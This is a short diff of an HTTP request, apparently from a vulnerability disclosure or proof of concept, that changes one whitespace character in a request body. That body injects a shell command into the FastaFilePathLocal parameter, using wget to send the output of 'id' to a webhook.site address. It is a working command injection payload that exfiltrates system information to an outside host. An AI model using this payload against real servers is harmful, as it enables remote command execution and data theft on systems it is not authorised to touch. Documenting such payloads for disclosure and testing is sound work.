@@ -11,4 +11,4 @@ Cookie: _ga=GA1.2.1253258619.1620055512; _gid=GA1.2.1110916899.1620055512; _gat_
 Upgrade-Insecure-Requests: 1
 Content-Length: 102
 
-FastaFilePathLocal=$(wget	https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b --post-data=$(id))
+FastaFilePathLocal=$(wget https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b --post-data=$(id))
